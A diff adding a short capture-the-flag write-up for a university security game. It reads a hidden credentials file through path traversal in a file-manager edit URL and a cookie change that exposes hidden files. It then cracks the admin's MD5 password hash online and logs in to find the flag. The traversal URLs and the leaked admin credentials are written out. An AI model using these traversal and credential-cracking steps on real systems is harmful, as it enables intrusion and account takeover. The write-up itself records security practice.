@@ -1,0 +1,34 @@
+watch the source of this website
+found someting in index.php, core/fun_login.php .config/.htusers.php
+
+target: get the ".config/.htusers.php"
+
+edit a file with link 
+https://game1.security.ntu.st/index.php?action=edit&item=index.html&order=name&srt=yes&lang=cht
+change "index.html" to other file 
+index.php -> nothing
+../index.php -> nothing
+../../index.php -> You are not allowed to access this file.
+
+read fun_edit.php
+found "if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);"
+read fun_extra.php
+found $GLOBALS["show_hidden"]==false will return false
+
+set cookie "show_hidden" to yes
+
+try again 
+https://game1.security.ntu.st/index.php?action=edit&item=../../index.html&order=name&srt=yes&lang=cht
+read the right file
+
+https://game1.security.ntu.st/index.php?action=edit&item=../../.config/.htusers.php&order=name&srt=yes&lang=cht
+got this
+array("adm1n15trat0r", "34af0d074b17f44d1bb939765b02776f", "./data", "https://game1.security.ntu.st/data", 1, "^.ht", 7, 1),
+
+throw "34af0d074b17f44d1bb939765b02776f" to http://md5decryption.com/
+Decrypted Text: how do you turn this on
+get the password of "adm1n15trat0r"
+
+login with account "adm1n15trat0r"
+
+found FLAG in ".flag-2_（´・ω・｀）.txt"
